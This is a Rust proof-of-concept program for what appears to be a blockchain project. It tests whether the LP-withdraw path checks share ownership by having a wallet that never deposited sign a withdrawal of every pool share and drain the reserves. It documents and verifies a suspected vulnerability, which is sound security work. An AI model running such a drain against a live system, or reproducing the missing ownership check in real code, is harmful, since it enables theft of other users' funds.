//! `lp_ownership_poc` — does the LP-withdraw path check that the withdrawer
//! actually OWNS any LP shares?
//!
//! Reading suggests it cannot: `PoolState.lp_shares` is a POOL-LEVEL TOTAL and
//! a workspace-wide search finds no per-wallet LP-share ledger anywhere. The
//! `SigilTx::LpWithdraw` arm (sigil-tx/src/lib.rs:1226) checks only that the
//! caller can pay the flat `fee`, then burns `shares` from the pool total and
//! pays out the pro-rata reserves to `from`. The state chokepoint's
//! `apply_lp_burn_delta` verifies only that the pool ARITHMETIC is
//! self-consistent, so it cannot catch this either.
//!
//! This binary TESTS that claim rather than asserting it. To remove any
//! "well, the transaction wasn't authenticated" objection, MALLORY uses a real
//! ed25519 keypair and her withdrawal is a genuinely, validly signed
//! transaction — `verify_signature()` is called and asserted to PASS before
//! the tx is applied. The question is not whether she is who she says she is.
//! The question is whether the protocol has any concept of her owning shares.
//!
//! Run: fluxc build --release -p sigil-tx --example lp_ownership_poc

use sigil_state::{commit_state_transition, SigilState, StateMutation, StateTransition, NATIVE};
use sigil_tx::{apply_tx, ed25519_keygen, ed25519_sign_tx, SigilTx, SignedTx};

const TOKEN_X: [u8; 32] = [0x11; 32];

/// Drive one SIGNED tx through the real pipeline exactly as a producer would:
/// verify_signature (the ingest gate) -> apply_tx -> commit_state_transition.
fn run(state: &mut SigilState, signed: &SignedTx, height: u64, label: &str) -> bool {
    match signed.verify_signature() {
        Ok(()) => println!("  {label}: signature VERIFIES (genuine, authenticated tx)"),
        Err(e) => {
            println!("  {label}: signature rejected -> {e}");
            return false;
        }
    }
    match apply_tx(state, signed) {
        Ok(out) => {
            let transition = StateTransition { at_height: height, mutations: out.mutations };
            match commit_state_transition(state, &transition, height) {
                Ok(_) => {
                    println!("  {label}: ACCEPTED");
                    true
                }
                Err(e) => {
                    println!("  {label}: rejected at state chokepoint -> {e}");
                    false
                }
            }
        }
        Err(e) => {
            println!("  {label}: rejected at tx layer -> {e}");
            false
        }
    }
}

fn main() {
    let (alice_sk, alice_pk, alice) = ed25519_keygen();
    let (mal_sk, mal_pk, mallory) = ed25519_keygen();

    let mut state = SigilState::new();

    // Fund both. Alice will be the sole liquidity provider. Mallory gets ONLY
    // enough native SIGIL to pay a transaction fee — no TOKEN_X, and she never
    // deposits into any pool.
    let seed = StateTransition {
        at_height: 0,
        mutations: vec![
            StateMutation::SetBalance { wallet: alice, token: NATIVE, amount: 10_000_000 },
            StateMutation::SetBalance { wallet: alice, token: TOKEN_X, amount: 10_000_000 },
            StateMutation::SetBalance { wallet: mallory, token: NATIVE, amount: 1_000 },
        ],
    };
    commit_state_transition(&mut state, &seed, 0).expect("seed");

    let pool_id: [u8; 32] = *blake3::hash(b"lp-ownership-poc-pool").as_bytes();

    println!("\n=== 1. ALICE provides ALL the liquidity ===");
    let deposit = ed25519_sign_tx(
        SigilTx::LpDeposit {
            from: alice,
            pool: pool_id,
            token_a: NATIVE,
            token_b: TOKEN_X,
            amt_a: 1_000_000,
            amt_b: 1_000_000,
            fee_bps: 30,
            fee: 10,
        },
        &alice_sk,
        &alice_pk,
    );
    if !run(&mut state, &deposit, 1, "alice LpDeposit 1,000,000 / 1,000,000") {
        println!("\nPool could not be created — POC inconclusive.");
        return;
    }

    let pool = state.pool(&pool_id).expect("pool exists").clone();
    println!(
        "  pool: reserve_a={} reserve_b={} lp_shares={}",
        pool.reserve_a, pool.reserve_b, pool.lp_shares
    );

    println!("\n=== 2. MALLORY before acting (never deposited a single unit) ===");
    let m_native_0 = state.balance_of(&mallory, &NATIVE);
    let m_tokenx_0 = state.balance_of(&mallory, &TOKEN_X);
    println!("  MALLORY native={m_native_0} tokenX={m_tokenx_0}");

    println!("\n=== 3. MALLORY withdraws ALL of the pool's LP shares ===");
    let all_shares = pool.lp_shares;
    let withdraw = ed25519_sign_tx(
        SigilTx::LpWithdraw { from: mallory, pool: pool_id, shares: all_shares, fee: 10 },
        &mal_sk,
        &mal_pk,
    );
    let drained = run(
        &mut state,
        &withdraw,
        2,
        &format!("mallory LpWithdraw shares={all_shares}"),
    );

    println!("\n=== 4. Result ===");
    let m_native_1 = state.balance_of(&mallory, &NATIVE);
    let m_tokenx_1 = state.balance_of(&mallory, &TOKEN_X);
    let a_native_1 = state.balance_of(&alice, &NATIVE);
    let a_tokenx_1 = state.balance_of(&alice, &TOKEN_X);
    let after = state.pool(&pool_id).expect("pool").clone();
    println!("  MALLORY native {m_native_0} -> {m_native_1} · tokenX {m_tokenx_0} -> {m_tokenx_1}");
    println!("  ALICE   native {a_native_1} · tokenX {a_tokenx_1}  (she provided everything)");
    println!(
        "  pool: reserve_a {} -> {} · reserve_b {} -> {} · lp_shares {} -> {}",
        pool.reserve_a, after.reserve_a,
        pool.reserve_b, after.reserve_b,
        pool.lp_shares, after.lp_shares
    );

    println!("\n=== VERDICT ===");
    let gained_x = m_tokenx_1.saturating_sub(m_tokenx_0);
    let gained_n = m_native_1.saturating_sub(m_native_0);
    if drained && (gained_x > 0 || gained_n > 0) {
        println!("  ** CONFIRMED: LP shares carry NO ownership record.");
        println!("     A validly-signed wallet that never provided liquidity withdrew");
        println!("     {gained_x} TOKEN_X and {gained_n} NATIVE from a pool funded entirely by someone else.");
        println!("     Pool reserves went {} -> {} and {} -> {}.",
                 pool.reserve_a, after.reserve_a, pool.reserve_b, after.reserve_b);
    } else if !drained {
        println!("  Withdraw REJECTED — an ownership check exists after all. Good.");
    } else {
        println!("  Accepted but Mallory gained nothing — inconclusive, investigate.");
    }
}
